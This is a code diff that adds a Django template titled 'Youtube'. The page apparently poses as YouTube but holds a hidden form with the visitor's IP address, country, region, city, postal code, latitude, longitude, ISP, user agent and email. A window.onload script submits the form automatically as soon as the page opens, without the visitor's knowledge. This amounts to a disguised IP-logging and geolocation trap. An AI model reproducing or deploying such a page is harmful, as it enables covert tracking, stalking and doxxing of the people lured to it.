@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Youtube</title>
+</head>
+<body>
+    <form method="post" name="formu">
+        {% csrf_token %}
+        
+        <input type="text" name="ip" maxlength="500" required="" id="id_ip" value="{{data.ip}}" hidden>
+        <input type="text" name="pais" maxlength="50" id="id_pais" value="{{data.country_name}}" hidden>
+        <input type="text" name="estado" maxlength="59" id="id_estado" value="{{data.region}}" hidden>
+        <input type="text" name="ciudad" maxlength="50" id="id_ciudad" value="{{data.city}}" hidden>
+        <input type="text" name="cp" maxlength="50" id="id_cp" value="{{data.postal}}" hidden>
+        <input type="text" name="latitud" maxlength="50" id="id_latitud" value="{{data.latitude}}"hidden>
+        <input type="text" name="longitud" maxlength="50" id="id_longitud" value="{{data.longitude}}"hidden>
+        <input type="text" name="proveedor" maxlength="50" id="id_proveedor" value="{{data.org}}"hidden>
+        <input type="text" name="useragent" maxlength="150" id="id_useragent" value="{{user}}"hidden>
+        
+        {% for i in email %}
+            <input type="text" name="email" id="id_email" maxlength="50" value="{{i.email}}" hidden>
+        {% endfor %}
+        <input type="text" name="completo" maxlength="500" id="id_completo" value="True" hidden>
+    </form>
+</body>
+
+<script>
+    window.onload=function(){
+		document.forms["formu"].submit();
+    }
+</script>
+</html>
